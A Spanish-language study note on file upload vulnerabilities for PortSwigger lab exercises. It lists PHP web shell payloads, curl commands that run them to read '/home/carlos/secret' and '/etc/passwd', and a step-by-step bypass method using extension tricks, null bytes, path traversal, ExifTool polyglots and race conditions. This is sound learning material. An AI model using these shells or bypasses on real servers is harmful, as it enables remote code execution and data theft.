# File Upload Vulnerabilities

> Un formulario de subida es peligroso cuando **falla la validación** de lo que
> se sube. El objetivo típico es **RCE** subiendo un web shell (`.php`, `.jsp`…)
> y forzando que el servidor lo **ejecute**.

---

## ¿Dónde falla la validación?

| Campo        | Si no se valida bien…                                              |
| ------------ | ----------------------------------------------------------------- |
| **name**     | sobrescribir archivos · **path traversal** (`../`) → RCE casi seguro |
| **type**     | `Content-Type` falseable desde el cliente                          |
| **contents** | web shell → **RCE** (`.php`, `.jsp`, `.aspx`)                      |
| **size**     | **DoS** llenando el disco                                         |

## ¿Qué NO frena un ataque por sí solo?

> [!warning] Defensas débiles
> - **Blacklist de extensiones** → siempre queda alguna ejecutable: `.php5`, `.phtml`, `.shtml`, `.phar`.
> - **Validación por contenido** → NO es infalible. Ej.: los JPEG empiezan por `FF D8 FF`; se pueden falsificar esos *magic bytes* al principio del archivo.

---

## 🐚 Web shells: cómo invocarlos (leer `/home/carlos/secret`)

> [!tip] Lo que casi siempre pide el lab
> Una vez el shell está **subido y servido** (normalmente en `/files/avatars/`),
> lo ejecutás pidiéndolo por GET. El objetivo suele ser **leer `/home/carlos/secret`**
> y pegarlo en *Submit solution*.

| Archivo (en esta carpeta) | Payload | Cómo se llama (URL) |
| ------------------------- | ------- | ------------------- |
| [[example_best.php]] | `<?php system($_GET['command']); ?>` | `…/files/avatars/example_best.php?command=cat%20/home/carlos/secret` |
| [[example.php]] | `<?php echo system($_GET['command']); ?>` | igual, `?command=…` (⚠ duplica la última línea) |
| [[file-upload-vulnerabilities/exploit.php\|exploit.php]] | `<?php echo file_get_contents('/home/carlos/secret'); ?>` | `…/files/avatars/exploit.php` **(sin parámetro, ya lee el secreto)** |
| [[polyglot-web-shell-rce/build_polyglot.py]] → `exploit.php` | `<?php echo system($_GET["cmd"]); ?>` | `…/files/avatars/exploit.php?cmd=cat%20/home/carlos/secret` (ojo: param **`cmd`**) |

```bash
# Shell de comandos (system): el comando que interesa es leer el secreto
curl 'https://LAB-ID.web-security-academy.net/files/avatars/example_best.php?command=cat%20/home/carlos/secret'
curl 'https://LAB-ID.web-security-academy.net/files/avatars/example_best.php?command=id'      # comprobar RCE

# Lector directo (file_get_contents): no lleva parámetro
curl 'https://LAB-ID.web-security-academy.net/files/avatars/exploit.php'

# Polyglot generado por build_polyglot.py -> parámetro cmd
curl 'https://LAB-ID.web-security-academy.net/files/avatars/exploit.php?cmd=cat%20/home/carlos/secret'
```

> [!note] Elegir shell
> - **`?command=`** (system) → RCE genérico, corrés cualquier comando (`id`, `ls`, `cat …`).
> - **`file_get_contents`** → cuando solo querés el secreto y no un shell.
> - El espacio en la URL va como `%20`. Para otro fichero: `?command=cat%20/etc/passwd`.

---

## Metodología: de lo simple a lo rebuscado

> Probar en este orden. En cuanto uno pase el filtro **y** se ejecute → RCE.

### 1. Subida directa

- [ ] Subir `exploit.php` tal cual. Si ejecuta → fin.
- [ ] Localizar dónde queda servido (`/files/avatars/…`) y pedirlo por GET.

### 2. Saltar el `Content-Type`

- [ ] Cambiar el header a `image/jpeg` (o el que exija) manteniendo cuerpo PHP.

### 3. Jugar con la extensión

| Truco                     | Ejemplo             | Comentario                                    |
| ------------------------- | ------------------- | --------------------------------------------- |
| Mayús/minús               | `exploit.pHp`       | filtros que solo comparan `.php` en minúscula |
| Doble extensión           | `exploit.php.jpg`   | pasa por "es jpg"; algunos servers ejecutan por la 1ª |
| Extensión + punto colgante| `exploit.php.`      | el `.` final se recorta al guardar → `exploit.php` |
| Segunda ext. permitida    | `exploit.jpg.php`   | la última manda si el server la respeta       |
| URL encoding              | `exploit%2Ephp`     | y **doble**: `%252E`                           |
| Punto y coma (IIS)        | `exploit.asp;.jpg`  | IIS ejecuta hasta el `;`                       |
| **NULL byte**             | `exploit.asp%00.jpg`| trunca en el `%00` → `exploit.asp`             |
| Overlong UTF-8            | `xC0 x2E`, `xC0 xAE`| algunas decodifican a `.`                      |
| Reemplazo ingenuo         | `exploit.p.phphp`   | si el filtro borra `.php` una vez → queda `.php` |

### 4. Cambiar la ruta de guardado

- [ ] **Path traversal** en el `filename`: `../../exploit.php` para salir de la carpeta de uploads y caer en una ejecutable.

### 5. Polyglot con ExifTool

- [ ] Meter PHP en el metadato `Comment` de un JPEG real → archivo que es **JPEG válido + PHP** a la vez (pasa validación de contenido). Ver [[polyglot-web-shell-rce/build_polyglot.py]].

### 6. Condición de carrera (race condition)

- [ ] El archivo **existe unos ms** antes de que el antivirus/validador lo borre. Subir y pedirlo en paralelo dentro de esa ventana.

---

## Otros impactos (no siempre RCE)

| Vector                 | Impacto                                              |
| ---------------------- | ---------------------------------------------------- |
| `.html` / `.svg`       | **Stored XSS** (el SVG ejecuta JS al renderizar)     |
| `.svg` / `.xml`        | **XXE** (entidades externas)                         |
| Método **PUT**         | puede saltarse validaciones que solo aplican al POST |

---

## Referencias

- PortSwigger — [File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [[polyglot-web-shell-rce/build_polyglot.py]] · web shell PHP embebido en JPEG
